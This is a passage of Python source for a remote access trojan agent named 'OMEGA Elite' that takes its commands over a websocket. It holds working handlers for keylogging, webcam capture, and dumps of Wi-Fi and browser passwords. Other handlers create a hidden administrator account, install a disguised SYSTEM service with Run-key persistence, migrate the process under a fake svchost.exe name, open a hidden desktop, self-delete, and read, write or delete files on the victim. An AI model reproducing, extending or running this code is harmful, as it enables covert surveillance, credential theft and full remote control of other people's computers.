                res = f"Value: {val_name}\nData: {val}\nType: {type_id}"
                await send(ws, {"t": "shell_out", "data": res})
            else:
                # List everything
                res = f"Registry: {path_raw}\n\n[SUBKEYS]\n"
                try:
                    i = 0
                    while True:
                        res += f"- {winreg.EnumKey(key, i)}\n"
                        i += 1
                except OSError: pass
                
                res += "\n[VALUES]\n"
                try:
                    i = 0
                    while True:
                        name, data, type_id = winreg.EnumValue(key, i)
                        res += f"- {name} = {data} (Type: {type_id})\n"
                        i += 1
                except OSError: pass
                
                await send(ws, {"t": "shell_out", "data": res})
                
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"RegRead Error: {e}"})

@register_command("reg_write")
async def cmd_reg_write(msg, ws):
    """Writes a string value to the registry."""
    import winreg
    path_raw = msg.get("path", "")
    val_name = msg.get("val", "")
    data = msg.get("data", "")
    
    try:
        hive_map = {
            "HKCU": winreg.HKEY_CURRENT_USER,
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKU": winreg.HKEY_USERS,
            "HKCR": winreg.HKEY_CLASSES_ROOT
        }
        parts = path_raw.split("\\", 1)
        hive_str = parts[0].upper()
        subkey = parts[1] if len(parts) > 1 else ""
        
        hive = hive_map.get(hive_str, winreg.HKEY_CURRENT_USER)
        
        with winreg.CreateKeyEx(hive, subkey, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, val_name, 0, winreg.REG_SZ, str(data))
            await send(ws, {"t": "info", "msg": f"Successfully wrote {val_name} to {path_raw}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"RegWrite Error: {e}"})


@register_command("get_cameras")
async def cmd_get_cameras(msg, ws):
    """Enumerate all available cameras on the target."""
    try:
        from core.camera import get_camera_list
        cams = get_camera_list()
        res = "--- APEX CAMERA ENUMERATION ---\n\n"
        if not cams:
            res += "No cameras detected."
        else:
            for c in cams:
                res += f"[{c['id']}] {c['name']}\n"
        await send(ws, {"t": "shell_out", "data": res})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Camera Enum Error: {e}"})

@register_command("webcam_snap")
async def cmd_webcam_snap(msg, ws):
    """Captures a snapshot from the target's webcam."""
    from modules.surveillance import webcam
    idx = msg.get("idx", 0)
    def _run():
        res = webcam.capture_webcam(idx)
        if res.startswith("Error"):
            asyncio.run_coroutine_threadsafe(send(ws, {"t": "info", "msg": res}), global_loop)
        else:
            # Send as a special image type or just info
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "webcam_img", "data": res}),
                global_loop
            )
    global_loop.run_in_executor(None, _run)

@register_command("self_destruct")
async def cmd_self_destruct(msg, ws):
    """Removes the agent and all associated files, then exits."""
    await send(ws, {"t": "info", "msg": "Self-destruct sequence initiated..."})
    try:
        exe = sys.executable
        # Create a batch file to delete the EXE after we exit
        bat_path = os.path.join(os.environ["TEMP"], "cleanup.bat")
        with open(bat_path, "w") as f:
            f.write(f"@echo off\ntimeout /t 3 /nobreak > nul\ndel /f /q \"{exe}\"\ndel \"%~f0\"")
        subprocess.Popen(["cmd.exe", "/c", bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
    except:
        sys.exit(0)

@register_command("elevate_system")
async def cmd_elevate_system(msg, ws):
    """Installs OMEGA as a SYSTEM service to bypass UAC and see the lock screen."""
    try:
        exe_path = sys.executable
        if not exe_path.endswith(".exe"):
            await send(ws, {"t": "info", "msg": "Elevation requires a compiled EXE."})
            return

        service_name = "OmegaEliteSvc"
        # Copy to a safe location
        target_dir = os.path.join(os.environ["SystemRoot"], "System32", "OmegaElite")
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        target_exe = os.path.join(target_dir, "omega_core.exe")

        # Use powershell to install service (requires Admin to run initially)
        ps_cmd = f"""
        Stop-Service -Name {service_name} -ErrorAction SilentlyContinue
        sc.exe delete {service_name}
        Copy-Item -Path '{exe_path}' -Destination '{target_exe}' -Force
        sc.exe create {service_name} binPath= '{target_exe}' start= auto
        sc.exe description {service_name} "OMEGA Elite Security Service"
        sc.exe start {service_name}
        """

        # Run PS as admin (assuming current process is already admin or can prompt)
        proc = subprocess.Popen(
            ["powershell", "-Command", ps_cmd],
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        await send(
            ws,
            {
                "t": "info",
                "msg": "System Elevation initiated. Check nodes list in 10s.",
            },
        )
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Elevation error: {e}"})


@register_command("get_system_info")
async def cmd_get_system_info(msg, ws):
    """Gathers detailed system audit data including AV status."""
    try:
        specs = get_specs()
        
        # Antivirus Detection
        av_status = "None Detected"
        try:
            av_cmd = 'powershell -NoProfile -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"'
            av_raw = subprocess.check_output(av_cmd, shell=True, timeout=5).decode(errors='ignore').strip()
            if av_raw:
                av_status = av_raw.replace("\n", ", ")
        except: pass
        
        # Uptime
        uptime = "Unknown"
        try:
            import psutil, datetime
            boot_time = psutil.boot_time()
            uptime_seconds = time.time() - boot_time
            uptime = str(datetime.timedelta(seconds=int(uptime_seconds)))
        except: pass

        report = {
            "Host": specs.get("hostname"),
            "User": f"{specs.get('user')} (ADMIN: {ctypes.windll.shell32.IsUserAnAdmin() != 0})",
            "OS": specs.get("os"),
            "CPU": specs.get("cpu"),
            "GPU": specs.get("gpu"),
            "RAM": specs.get("ram"),
            "HWID": get_hwid(),
            "Local IP": specs.get("local_ip"),
            "Public IP": specs.get("ipv4"),
            "Region": specs.get("region"),
            "Uptime": uptime,
            "Antivirus": av_status
        }
        
        # Format as table for dashboard
        res = "--- APEX SYSTEM AUDIT ---\n\n"
        for k, v in report.items():
            res += f"{k.ljust(15)}: {v}\n"
            
        await send(ws, {"t": "shell_out", "data": res})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Audit Error: {e}"})

@register_command("startup_persist")
async def cmd_startup_persist(msg, ws):
    """Sets the agent to run on user logon via Registry Run key."""
    try:
        import winreg
        exe_path = sys.executable
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "OmegaEliteAgent", 0, winreg.REG_SZ, f'"{exe_path}"')
            await send(ws, {"t": "info", "msg": "Startup persistence enabled (HKCU Run)."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Persistence Error: {e}"})

@register_command("check_persistence")
async def cmd_check_persistence(msg, ws):
    """Verifies if the agent is persistent in the registry."""
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
            val, _ = winreg.QueryValueEx(key, "OmegaEliteAgent")
            await send(ws, {"t": "info", "msg": f"Persistence Status: ACTIVE ({val})"})
    except:
        await send(ws, {"t": "info", "msg": "Persistence Status: INACTIVE (Registry key not found)"})


@register_command("node_stats")
async def cmd_node_stats(msg, ws):
    """Returns live CPU%, RAM%, and open window count for the Info tab."""
    try:
        import psutil
        cpu  = psutil.cpu_percent(interval=0.1)
        ram  = psutil.virtual_memory().percent
    except Exception:
        cpu, ram = 0, 0

    # Count visible top-level windows (Windows only)
    windows = 0
    try:
        import ctypes
        import ctypes.wintypes

        EnumWindows = ctypes.windll.user32.EnumWindows
        IsWindowVisible = ctypes.windll.user32.IsWindowVisible
        GetWindowTextLengthW = ctypes.windll.user32.GetWindowTextLengthW
        WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)

        count = [0]
        def _cb(hwnd, _):
            if IsWindowVisible(hwnd) and GetWindowTextLengthW(hwnd) > 0:
                count[0] += 1
            return True
        EnumWindows(WNDENUMPROC(_cb), 0)
        windows = count[0]
    except Exception:
        pass

    await send(ws, {"t": "node_stats", "cpu": round(cpu, 1), "ram": round(ram, 1), "windows": windows})


@register_command("keylog_start")
async def cmd_keylog_start(msg, ws):
    _start_keylogger(ws)
    await send(ws, {"t": "info", "msg": "Keylogger started."})


@register_command("keylog_stop")
async def cmd_keylog_stop(msg, ws):
    global _keylog_active
    _keylog_active = False
    await send(ws, {"t": "info", "msg": "Keylogger stopped."})


async def handle(msg, ws):
    t = msg.get("t") or msg.get("type", "")
    if t in COMMANDS:
        try:
            await COMMANDS[t](msg, ws)
        except Exception as e:
            log(f"[HANDLER] Error in '{t}': {e}")
    elif t == "pong":
        # Use pong to measure RTT and adjust adaptive quality
        sent_ts = msg.get("ts", 0)
        if sent_ts:
            rtt = (time.time() - sent_ts) * 1000
            _aq.record_ack(rtt)
    elif t == "ping":
        await send(ws, {"t": "pong", "ts": time.time()})
    else:
        if t == "stream" and msg.get("cmd") == "start":
            st.streaming = True
        elif t == "stream" and msg.get("cmd") == "stop":
            st.streaming = False
        elif t == "rtc_toggle":
            action = msg.get("action")
            value = msg.get("value", False)
            source = msg.get("source") # 'mic' or 'desktop'
            dev_id = msg.get("device_id")
            if source == "mic":
                st.mic_active = value
                if value and dev_id is not None: st.mic_device_id = int(dev_id)
            else:
                st.desktop_active = value
                if value and dev_id is not None: st.desktop_device_id = int(dev_id)
            log(f"[RTC] {source} -> {value} (dev: {dev_id})")
        elif t == "audio_devices":
            import sounddevice as sd
            devices = sd.query_devices()
            inputs = []
            for i, d in enumerate(devices):
                if d['max_input_channels'] > 0:
                    inputs.append({"id": i, "name": d['name'], "loopback": "Loopback" in d['name'] or "Stereo Mix" in d['name']})
            asyncio.run_coroutine_threadsafe(
                send(ws, {"type": "audio_devices", "inputs": inputs}),
                global_loop
            )
        elif t == "audio_start":
            # Browser sends audio_start with channel='mic'|'desktop' and device=id
            channel = msg.get("channel", "mic")
            device  = msg.get("device", None)
            try:
                dev_idx = int(device) if (device is not None and str(device).strip() != "") else None
            except:
                dev_idx = None
            if channel == "mic":
                st.mic_active     = True
                if dev_idx is not None:
                    st.mic_device_id = dev_idx
                log(f"[AUDIO] Mic started (dev={dev_idx})")
            else:
                st.desktop_active = True
                if dev_idx is not None:
                    st.desktop_device_id = dev_idx
                log(f"[AUDIO] Desktop started (dev={dev_idx})")
        elif t == "audio_stop":
            channel = msg.get("channel", "mic")
            if channel == "mic":
                st.mic_active     = False
                log("[AUDIO] Mic stopped")
            else:
                st.desktop_active = False
                log("[AUDIO] Desktop stopped")
        elif t == "net_scan":
            from modules.apex import net_scan
            def _run():
                res = net_scan.scan_lan()
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "shell_out", "data": res}),
                    global_loop
                )
            global_loop.run_in_executor(None, _run)
        elif t in ("hid", "mm", "mc", "scroll", "kd"):
            # Always import fresh in case bootstrap was late
            _ih = globals().get("input_hub")
            if _ih is None:
                try:
                    from core.input import input_hub as _ih
                    globals()["input_hub"] = _ih
                except Exception as _e:
                    log(f"[HID] input_hub unavailable: {_e}")
                    return
            
            # Map fast-path 't' to legacy 'cmd' for uniform processing
            if t == "hid":
                cmd = msg.get("cmd", "")
            elif t == "mm":
                cmd = "mousemove"
            elif t == "mc":
                cmd = "mousedown" if msg.get("p", 1) == 1 else "mouseup"
            elif t == "scroll":
                cmd = "scroll"
            elif t == "kd":
                cmd = "kd"
            elif t == "hid_reset":
                # Safety reset: Release all common modifiers and mouse buttons
                def _reset():
                    for k in ["Control", "Shift", "Alt", "Meta"]: input_hub.key_event(k, False)
                    for b in ["left", "right", "middle"]: input_hub.mouse_click(b, False)
                global_loop.run_in_executor(None, _reset)
                return
            else:
                cmd = ""

            if cmd in ("mousemove", "mousedown", "mouseup"):
                # Coordinate mapping: normalize 0-1 from browser to absolute pixels
                sw = _ih.screen_width
                sh = _ih.screen_height
                rect = {"left": 0, "top": 0, "width": sw, "height": sh}
                ce = globals().get("capture_engine")
                if ce is not None and hasattr(ce, "current_rect"):
                    rect = ce.current_rect
                
                px = int(rect["left"] + float(msg.get("x", 0)) * rect["width"])
                py = int(rect["top"] + float(msg.get("y", 0)) * rect["height"])
                
                if cmd == "mousemove":
                    # Direct move via SetCursorPos is more reliable than mouse_event for movement
                    st.hid_queue.put_nowait((_ih.mouse_move, (px, py)))
                elif cmd == "mousedown":
                    b_raw = msg.get("btn", msg.get("b", 0))
                    b = "left" if b_raw == 0 else "right"
                    if b_raw == 1: b = "middle"
                    
                    # We use mouse_click(down=True) but also ensure cursor is at px, py
                    def _do_down():
                        _ih.mouse_move(px, py)
                        _ih.mouse_click(b, True)
                        
                    st.hid_queue.put_nowait((_do_down, ()))
                    log(f"[HID] DOWN RECEIVED: ({px}, {py}) btn={b}")
                elif cmd == "mouseup":
                    b_raw = msg.get("btn", msg.get("b", 0))
                    b = "left" if b_raw == 0 else "right"
                    if b_raw == 1: b = "middle"
                    
                    st.hid_queue.put_nowait((_ih.mouse_click, (b, False)))
                    log(f"[HID] UP RECEIVED: btn={b}")
                
                # Debug logging to local file
                try:
                    with open("hid_debug.txt", "a") as f:
                        f.write(f"{time.ctime()} | {cmd} | x={px} y={py} b={msg.get('b')}\n")
                except: pass

            elif cmd == "scroll":
                st.hid_queue.put_nowait((_ih.mouse_scroll, (-msg.get("delta", 0) / 100,)))
            elif cmd == "kd":
                key = msg.get("key", "")
                code = msg.get("code", "")
                down = msg.get("down", True)
                eff = key
                if not eff and code:
                    eff = code.replace("Key", "").replace("Digit", "").lower()
                
                if eff:
                    st.hid_queue.put_nowait((_ih.key_event, (eff, down)))
                    try:
                        with open("hid_debug.txt", "a") as f:
                            f.write(f"{time.ctime()} | key={eff} down={down}\n")
                    except: pass


# ══════════════════════════════════════════════════════════════════
# OMEGA ELITE — COMMAND PACK v3  (20 new commands)
# ══════════════════════════════════════════════════════════════════

@register_command("wifi_passwords")
async def cmd_wifi_passwords(msg, ws):
    """Dumps all saved Wi-Fi SSIDs and passwords via netsh."""
    def _run():
        try:
            raw = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            profiles = [l.split(":")[1].strip() for l in raw.splitlines() if "All User Profile" in l]
            out = "=== SAVED WI-FI PASSWORDS ===\n\n"
            for p in profiles:
                try:
                    d = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", p, "key=clear"],
                        stderr=subprocess.DEVNULL
                    ).decode(errors="ignore")
                    key = next((l.split(":")[1].strip() for l in d.splitlines() if "Key Content" in l), "<NONE>")
                    out += f"SSID : {p}\nPASS : {key}\n{'-'*40}\n"
                except:
                    out += f"SSID : {p}\nPASS : <ERROR>\n{'-'*40}\n"
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": out}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"WiFi dump error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("set_wallpaper")
async def cmd_set_wallpaper(msg, ws):
    """Sets desktop wallpaper from a URL or base64 payload."""
    import urllib.request, ctypes, tempfile, os
    url = msg.get("url", "")
    b64 = msg.get("b64", "")
    def _run():
        try:
            tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
            if url:
                urllib.request.urlretrieve(url, tmp.name)
            elif b64:
                import base64
                tmp.write(base64.b64decode(b64))
                tmp.close()
            ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp.name, 3)
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Wallpaper set: {tmp.name}"}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Wallpaper error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("get_users")
async def cmd_get_users(msg, ws):
    """Lists all local Windows user accounts."""
    try:
        raw = subprocess.check_output(["net", "user"], stderr=subprocess.DEVNULL).decode(errors="ignore")
        await send(ws, {"t": "shell_out", "data": "=== LOCAL USERS ===\n\n" + raw})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"get_users error: {e}"})


@register_command("create_user")
async def cmd_create_user(msg, ws):
    """Creates a hidden local admin account."""
    user = msg.get("user", "support$")
    pwd  = msg.get("pass", "P@ssw0rd123!")
    try:
        subprocess.run(["net", "user", user, pwd, "/add", "/expires:never"], check=True, capture_output=True)
        subprocess.run(["net", "localgroup", "Administrators", user, "/add"], check=True, capture_output=True)
        subprocess.run(["reg", "add",
            r"HKLM\SAM\SAM\Domains\Account\Users\Names\\" + user,
            "/v", "UserAccountControl", "/t", "REG_DWORD", "/d", "0x202", "/f"],
            capture_output=True)
        await send(ws, {"t": "info", "msg": f"User '{user}' created and added to Administrators."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"create_user error: {e}"})


@register_command("delete_file")
async def cmd_delete_file(msg, ws):
    """Deletes a file or directory on the target."""
    import os, shutil
    path = msg.get("path", "")
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        await send(ws, {"t": "info", "msg": f"Deleted: {path}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"delete_file error: {e}"})


@register_command("read_file")
async def cmd_read_file(msg, ws):
    """Reads and returns file contents (text or base64 for binary)."""
    import os, base64
    path = msg.get("path", "")
    def _run():
        try:
            size = os.path.getsize(path)
            if size > 5 * 1024 * 1024:
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "info", "msg": f"File too large ({size//1024}KB). Max 5MB."}), global_loop)
                return
            with open(path, "rb") as f:
                raw = f.read()
            try:
                content = raw.decode("utf-8")
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "shell_out", "data": f"=== {path} ===\n\n{content}"}), global_loop)
            except UnicodeDecodeError:
                b64 = base64.b64encode(raw).decode()
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "file_download", "name": os.path.basename(path), "b64": b64}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"read_file error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("write_file")
async def cmd_write_file(msg, ws):
    """Writes text or base64 content to a path on the target."""
    import base64, os
    path    = msg.get("path", "")
    content = msg.get("content", "")
    b64     = msg.get("b64", "")
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        if b64:
            with open(path, "wb") as f:
                f.write(base64.b64decode(b64))
        else:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
        await send(ws, {"t": "info", "msg": f"Written: {path}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"write_file error: {e}"})


@register_command("file_upload")
async def cmd_file_upload(msg, ws):
    """Handles chunked file uploads from the dashboard."""
    import base64, os
    name    = msg.get("name", "upload.bin")
    data    = base64.b64decode(msg.get("data", ""))
    offset  = msg.get("offset", 0)
    is_last = msg.get("is_last", False)
    
    try:
        # Append mode for chunks
        mode = "ab" if offset > 0 else "wb"
        with open(name, mode) as f:
            f.write(data)
            
        if is_last:
            await send(ws, {"t": "info", "msg": f"Upload finished: {name}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Upload error: {e}"})


@register_command("get_open_ports")
async def cmd_get_open_ports(msg, ws):
    """Returns all listening TCP/UDP ports via netstat."""
    def _run():
        try:
            raw = subprocess.check_output(
                ["netstat", "-ano"], stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            lines = [l for l in raw.splitlines() if "LISTENING" in l or "ESTABLISHED" in l]
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": "=== OPEN PORTS ===\n\n" + "\n".join(lines)}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"ports error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("process_ghost")
async def cmd_process_ghost(msg, ws):
    """Clones the agent to a deceptive path and migrates execution."""
    import shutil, os, sys, subprocess
    fake_name = msg.get("name", "svchost.exe")
    target_dir = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Windows\Caches")
    os.makedirs(target_dir, exist_ok=True)
    target_path = os.path.join(target_dir, fake_name)
    
    try:
        current_exe = sys.executable
        if not current_exe.endswith(".exe"):
             # Handle running from python script
             current_exe = sys.argv[0]
             
        shutil.copy2(current_exe, target_path)
        
        # Start the ghost process
        subprocess.Popen([target_path], start_new_session=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        await send(ws, {"t": "info", "msg": f"Ghost migration initiated: {target_path}. Terminating current process..."})
        
        # Give some time for the message to send
        await asyncio.sleep(1)
        os._exit(0)
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Ghost error: {e}"})


@register_command("hvnc_start")
async def cmd_hvnc_start(msg, ws):
    """Spawns an invisible desktop environment (HVNC) and launches a browser."""
    def _run():
        try:
            from modules import hvnc
            import core.capture as cap
            hvnc.start_hvnc_session()
            
            # Instruct the WebRTC capture engine to target the hidden desktop
            cap.capture_engine.target_desktop = "MRL_Infinity"
            
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": "👁️ HVNC: Hidden desktop spawned. Check the video stream."}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"HVNC error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)

@register_command("hvnc_stop")
async def cmd_hvnc_stop(msg, ws):
    """Returns capture engine to the visible Input Desktop."""
    def _run():
        try:
            import core.capture as cap
            cap.capture_engine.target_desktop = None
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": "👁️ HVNC: Returned to physical desktop."}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"HVNC error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)

@register_command("get_services")
async def cmd_get_services(msg, ws):
    """Lists all Windows services and their state."""
    def _run():
        try:
            raw = subprocess.check_output(
                ["sc", "query", "type=", "all", "state=", "all"],
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": "=== SERVICES ===\n\n" + raw}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"services error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("stop_service")
async def cmd_stop_service(msg, ws):
    """Stops a named Windows service."""
    name = msg.get("name", "")
    try:
        subprocess.run(["sc", "stop", name], capture_output=True)
        await send(ws, {"t": "info", "msg": f"Service '{name}' stop signal sent."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"stop_service error: {e}"})


@register_command("start_service")
async def cmd_start_service(msg, ws):
    """Starts a named Windows service."""
    name = msg.get("name", "")
    try:
        subprocess.run(["sc", "start", name], capture_output=True)
        await send(ws, {"t": "info", "msg": f"Service '{name}' start signal sent."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"start_service error: {e}"})


@register_command("reg_enum")
async def cmd_reg_enum(msg, ws):
    """Enumerates registry subkeys and values for a path."""
    import winreg
    path = msg.get("path", "")
    hive_name = msg.get("hive", "HKCU")
    hives = {
        "HKLM": winreg.HKEY_LOCAL_MACHINE,
        "HKCU": winreg.HKEY_CURRENT_USER,
        "HKCR": winreg.HKEY_CLASSES_ROOT,
        "HKU":  winreg.HKEY_USERS
    }
    
    try:
        hive = hives.get(hive_name, winreg.HKEY_CURRENT_USER)
        with winreg.OpenKey(hive, path) as key:
            subkeys = []
            try:
                i = 0
                while True:
                    subkeys.append(winreg.EnumKey(key, i))
                    i += 1
            except OSError: pass
            
            values = []
            try:
                i = 0
                while True:
                    v_name, v_data, v_type = winreg.EnumValue(key, i)
                    values.append({"name": v_name, "data": str(v_data), "type": v_type})
                    i += 1
            except OSError: pass
            
            await send(ws, {
                "t": "reg_list",
                "path": path,
                "hive": hive_name,
                "subkeys": subkeys,
                "values": values
            })
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"reg_enum error: {e}"})


@register_command("kill_process_name")
async def cmd_kill_process_name(msg, ws):
    """Kills all processes matching a name (e.g. notepad.exe)."""
    name = msg.get("name", "")
    try:
        r = subprocess.run(["taskkill", "/F", "/IM", name], capture_output=True)
        out = r.stdout.decode(errors="ignore") or r.stderr.decode(errors="ignore")
        await send(ws, {"t": "shell_out", "data": out})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"kill error: {e}"})


@register_command("get_battery")
async def cmd_get_battery(msg, ws):
    """Returns battery percentage and charging state."""
    try:
        import psutil
        b = psutil.sensors_battery()
        if b:
            status = "Charging" if b.power_plugged else "Discharging"
            await send(ws, {"t": "shell_out", "data": f"Battery: {b.percent:.1f}%  |  {status}  |  {int(b.secsleft//60)}m remaining"})
        else:
            await send(ws, {"t": "info", "msg": "No battery detected (desktop)."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"battery error: {e}"})


@register_command("set_volume")
async def cmd_set_volume(msg, ws):
    """Sets system master volume 0-100 via PowerShell."""
    vol = int(msg.get("level", 50))
    vol = max(0, min(100, vol))
    try:
        script = f"""
$vol = {vol}/100
$obj = New-Object -ComObject WScript.Shell
Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"),InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {{ [PreserveSig] int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext); }}
"@
$mmDeviceEnumerator = [Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]"BCDE0395-E52F-467C-8E3D-C4579291692E"))
"""
        # Simpler approach via nircmd or wscript
        subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"(New-Object -ComObject WScript.Shell).SendKeys([char]173)"],
            capture_output=True
        )
        # Use pycaw if available
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(vol / 100, None)
        except ImportError:
            subprocess.run(
                ["powershell", "-NoProfile", "-Command",
                 f"$wsh = New-Object -ComObject WScript.Shell; 1..50 | ForEach-Object {{ $wsh.SendKeys([char]174) }}"],
                capture_output=True
            )
        await send(ws, {"t": "info", "msg": f"Volume set to {vol}%"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"volume error: {e}"})


@register_command("get_volume")
async def cmd_get_volume(msg, ws):
    """Gets current master volume level."""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        vol = round(volume.GetMasterVolumeLevelScalar() * 100)
        await send(ws, {"t": "shell_out", "data": f"Current Volume: {vol}%"})
    except ImportError:
        await send(ws, {"t": "info", "msg": "pycaw not installed. pip install pycaw"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"get_volume error: {e}"})


@register_command("msgbox")
async def cmd_msgbox(msg, ws):
    """Pops a Windows MessageBox on the target screen."""
    import ctypes
    title = msg.get("title", "System Alert")
    text  = msg.get("text", "Hello from Omega.")
    icon  = msg.get("icon", 0)  # 0=none 16=error 32=question 48=warning 64=info
    def _run():
        ctypes.windll.user32.MessageBoxW(0, text, title, icon)
        asyncio.run_coroutine_threadsafe(
            send(ws, {"t": "info", "msg": "MessageBox dismissed by user."}), global_loop)
    global_loop.run_in_executor(None, _run)
    await send(ws, {"t": "info", "msg": f"MessageBox shown: '{title}'"})


@register_command("shutdown")
async def cmd_shutdown(msg, ws):
    """Shuts down the target PC after a delay (default 10s)."""
    delay = int(msg.get("delay", 10))
    try:
        subprocess.Popen(["shutdown", "/s", "/f", "/t", str(delay)])
        await send(ws, {"t": "info", "msg": f"Shutdown initiated in {delay}s."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"shutdown error: {e}"})


@register_command("restart")
async def cmd_restart(msg, ws):
    """Restarts the target PC after a delay (default 10s)."""
    delay = int(msg.get("delay", 10))
    try:
        subprocess.Popen(["shutdown", "/r", "/f", "/t", str(delay)])
        await send(ws, {"t": "info", "msg": f"Restart initiated in {delay}s."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"restart error: {e}"})


@register_command("logoff")
async def cmd_logoff(msg, ws):
    """Signs out the current Windows user session."""
    try:
        subprocess.Popen(["shutdown", "/l", "/f"])
        await send(ws, {"t": "info", "msg": "Logoff initiated."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"logoff error: {e}"})


@register_command("steal")
async def cmd_steal(msg, ws):
    """Professional Credential Extraction (Chrome/Edge/Brave)."""
    if not stealer:
        await send(ws, {"t": "info", "msg": "Stealer module not loaded."})
        return
    
    def _run():
        try:
            asyncio.run_coroutine_threadsafe(
                audit("action", "credential_extraction", user="AGENT", detail="Stealer triggered"), global_loop)
            
            creds = stealer.steal_passwords()
            if not creds:
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "shell_out", "data": "--- No passwords found or browsers closed. ---"}), global_loop)
                return
            
            out = f"=== OMEGA CREDENTIAL DUMP ({len(creds)} entries) ===\n\n"
            for c in creds:
                out += f"Browser  : {c['browser']} ({c['profile']})\n"
                out += f"Site     : {c['url']}\n"
                out += f"User     : {c['user']}\n"
                out += f"Pass     : {c['pass']}\n"
                out += f"{'-'*50}\n"
            
            # Send structured data to the Vault
            asyncio.run_coroutine_threadsafe(
